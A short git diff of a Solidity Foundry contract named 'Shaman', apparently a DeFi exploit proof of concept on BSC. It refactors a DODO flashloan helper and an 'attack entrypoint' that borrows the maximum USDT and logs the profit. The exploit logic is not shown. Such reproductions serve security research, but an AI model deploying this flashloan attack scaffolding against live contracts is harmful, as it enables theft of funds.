@@ -7,18 +7,18 @@ import {
 import {IERC20} from "../../interfaces/tokens/IERC20.sol";
 import {IPancakeRouter} from "../../interfaces/dex/pancakeswap/IPancakeRouter.sol";
 
-import {BscDppFlashloanHelper} from "../../lib/flashloan/dodo/BscDppFlashloanHelper.sol";
+import {BscDppSingleFlashloanHelper} from "../../lib/flashloan/dodo/BscDppFlashloanHelper.sol";
 
 import "forge-std/console.sol";
 
-contract Shaman is BscDppFlashloanHelper, RuinLocation {
+contract Shaman is BscDppSingleFlashloanHelper, RuinLocation {
 
 
     function peek() external {}
 
     // attack entrypoint
     function beat() external {
-        borrowUSDT(type(uint).max);
+        borrow(USDT, type(uint).max);
         console.log("[>*BOOM*<] Profit: %s USDT", IERC20(USDT).balanceOf(address(this)));
     }
 
